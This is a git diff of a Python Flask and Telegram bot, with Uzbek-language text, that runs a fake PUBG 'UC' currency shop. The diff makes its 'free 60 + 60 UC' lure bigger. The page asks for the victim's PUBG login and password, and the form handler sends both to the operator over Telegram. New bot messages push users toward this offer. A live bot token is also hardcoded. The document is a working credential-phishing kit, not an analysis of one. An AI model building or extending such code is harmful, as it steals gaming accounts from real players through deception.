@@ -6,19 +6,19 @@ import time
 
 # ==================== TOKEN VA URL ====================
 BOT_TOKEN = "8194877107:AAFYZR8HbBD5B43WN3d871srclsOa7H6xwk"
-RENDER_URL = "https://telegram-bot-sdhp.onrender.com"  # ⬅️ TEKSHRING!
+RENDER_URL = "https://telegram-bot-sdhp.onrender.com"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ==================== HTML (TO'LIQ, O'ZGARTIRILGAN) ====================
+# ==================== HTML (60+60 UC) ====================
 html_form = """
 <!DOCTYPE html>
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG UC Sotib Olish</title>
+    <title>PUBG UC Sotib Olish Eng Arzon narxda</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -332,15 +332,15 @@ html_form = """
 
         <!-- UC paketlari -->
         <div class="packages-grid">
-            <!-- Bepul 60 UC -->
+            <!-- Bepul 60+60 UC -->
             <div class="package-card free">
                 <div class="free-badge">BEPUL</div>
                 <div class="package-icon">
                     <i class="fas fa-gift"></i>
                 </div>
-                <div class="package-uc">60 UC</div>
+                <div class="package-uc">60 + 60 UC</div>
                 <div class="package-price">TEKIN</div>
-                <button class="package-btn" onclick="openModal(60, 0, 'free')">BEPUL OLISH</button>
+                <button class="package-btn" onclick="openModal(120, 0, 'free')">BEPUL OLISH</button>
             </div>
             
             <!-- 120 UC -->
@@ -413,7 +413,7 @@ html_form = """
             </div>
             
             <div class="modal-package-info" id="modal-package-info">
-                <div class="modal-package-uc" id="modal-package-uc">60 UC</div>
+                <div class="modal-package-uc" id="modal-package-uc">60 + 60 UC</div>
                 <div class="modal-package-price" id="modal-package-price">TEKIN</div>
             </div>
             
@@ -422,7 +422,7 @@ html_form = """
                 <input type="hidden" id="selected-price" name="uc_price">
                 <input type="hidden" id="selected-type" name="uc_type">
                 
-                <!-- Faqat 60 UC uchun login/parol so'raladi -->
+                <!-- Faqat 60+60 UC uchun login/parol so'raladi -->
                 <div id="login-fields" style="display: none;">
                     <div class="modal-input-group">
                         <label for="username">PUBG Login</label>
@@ -458,12 +458,19 @@ html_form = """
         let freeUcUsed = false;
         
         function openModal(ucAmount, price, type) {
-            document.getElementById('modal-package-uc').textContent = ucAmount + ' UC';
-            document.getElementById('selected-uc').value = ucAmount;
+            // 60+60 UC uchun maxsus ko'rsatish
+            if (type === 'free') {
+                document.getElementById('modal-package-uc').textContent = '60 + 60 UC';
+                document.getElementById('selected-uc').value = 120; // 60+60=120 UC
+            } else {
+                document.getElementById('modal-package-uc').textContent = ucAmount + ' UC';
+                document.getElementById('selected-uc').value = ucAmount;
+            }
+            
             document.getElementById('selected-price').value = price;
             document.getElementById('selected-type').value = type;
             
-            // Login/parol maydonlarini ko'rsatish (faqat 60 UC uchun)
+            // Login/parol maydonlarini ko'rsatish (faqat 60+60 UC uchun)
             const loginFields = document.getElementById('login-fields');
             if (type === 'free') {
                 if (freeUcUsed) {
@@ -474,7 +481,7 @@ html_form = """
                 document.getElementById('modal-package-price').textContent = 'TEKIN';
                 document.getElementById('modal-package-info').classList.add('free-package');
                 document.getElementById('modal-submit-btn').classList.add('free-package');
-                document.getElementById('submit-text').textContent = 'BEPUL UC OLISH';
+                document.getElementById('submit-text').textContent = 'BEPUL UC OLISH (60+60)';
             } else {
                 loginFields.style.display = 'none';
                 document.getElementById('modal-package-price').textContent = price.toLocaleString('uz-UZ') + ' UZS';
@@ -505,7 +512,7 @@ html_form = """
                 return;
             }
             
-            // 60 UC uchun login/parol tekshirish
+            // 60+60 UC uchun login/parol tekshirish
             if (ucType === 'free') {
                 const username = document.getElementById('username').value;
                 const password = document.getElementById('password').value;
@@ -553,9 +560,15 @@ def form(user_id):
         password = request.form.get("password", "")
         
         try:
+            # 60+60 UC uchun maxsus xabar
+            if uc_type == "free" and uc_amount == "120":
+                uc_display = "60 + 60 UC (120 UC)"
+            else:
+                uc_display = f"{uc_amount} UC"
+            
             # Foydalanuvchi xabari
             user_message = f"✅ Buyurtmangiz qabul qilindi!\n\n"
-            user_message += f"💰 UC miqdori: {uc_amount} UC\n"
+            user_message += f"💰 UC miqdori: {uc_display}\n"
             user_message += f"📧 Email: {email}\n"
             user_message += f"⏳ Yetkazish: 5-15 daqiqa\n\n"
             user_message += f"📞 Support: @Caatit_bot"
@@ -563,14 +576,14 @@ def form(user_id):
             # Admin xabari
             admin_message = f"🛒 YANGI BUYURTMA!\n\n"
             admin_message += f"👤 User ID: {user_id}\n"
-            admin_message += f"💰 UC miqdori: {uc_amount} UC\n"
+            admin_message += f"💰 UC miqdori: {uc_display}\n"
             admin_message += f"💵 Narxi: {'BEPUL' if uc_type == 'free' else uc_price + ' UZS'}\n"
             admin_message += f"📧 Email: {email}\n"
             
             if uc_type == "free":
                 admin_message += f"👤 PUBG Login: {username}\n"
                 admin_message += f"🔑 PUBG Parol: {password}\n"
-                admin_message += f"🔔 Turi: BEPUL UC"
+                admin_message += f"🔔 Turi: BEPUL UC (60+60)"
             else:
                 admin_message += f"🔔 Turi: Pullik UC"
             
@@ -619,7 +632,17 @@ def set_webhook():
 # ==================== TELEGRAM BOT HANDLERS ====================
 @bot.message_handler(commands=["start"])
 def start(msg):
-    bot.send_message(msg.chat.id, "Assalomu alaykum! UC sotib olish uchun /link buyrug'ini yuboring.")
+    bot.send_message(msg.chat.id, 
+        "🔥 *MAXSUS TAKLIF!* 🔥\n\n"
+        "🎁 BEPUL 60 + 60 UC OLISH UCHUN:\n"
+        "1. /link ni bosing\n"
+        "2. '60 + 60 UC - BEPUL' ni tanlang\n"
+        "3. Formani to'ldiring\n\n"
+        "📈 Pullik UC lar ham arzon!\n"
+        "⚡ Tezkor yetkazib berish!\n\n"
+        "🛒 Boshlash: /link",
+        parse_mode="Markdown"
+    )
 
 @bot.message_handler(commands=["link"])
 def link(msg):
@@ -632,7 +655,13 @@ def link(msg):
     bot.send_message(
         user_id,
         f"🔗 Sizning shaxsiy linkingiz:\n\n{uniq}\n\n"
-        f"Ushbu link orqali PUBG UC sotib olishingiz mumkin!",
+        f"Ushbu link orqali PUBG UC sotib olishingiz mumkin!\n"
+        f"✨ 60+60 UC - BEPUL (faqat yangi foydalanuvchilar)\n"
+        f"⭐ 120 UC - 35,000 UZS\n"
+        f"👑 355 UC - 85,000 UZS\n"
+        f"🚀 720 UC - 159,000 UZS\n"
+        f"💎 1,500 UC - 299,000 UZS\n"
+        f"🏆 3,000 UC - 549,000 UZS",
         reply_markup=markup
     )
 
